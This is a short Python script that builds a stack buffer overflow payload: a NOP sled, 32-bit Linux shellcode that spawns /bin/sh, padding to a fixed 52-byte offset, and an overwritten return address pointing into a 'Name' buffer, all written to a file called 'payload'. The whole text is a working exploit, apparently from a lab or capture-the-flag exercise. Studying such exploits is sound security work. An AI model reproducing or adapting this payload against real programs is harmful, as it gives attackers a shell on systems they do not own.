nopsled = b"\x90" * 4
shellcode = (b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")

padding = b"\x90" * (52-4-len(shellcode))

eip = b"\xa0\x6c\x0e\x08"  # Points to Name

payload = nopsled + shellcode + padding + eip

with open("payload", "wb") as f:
    f.write(payload)
    f.close()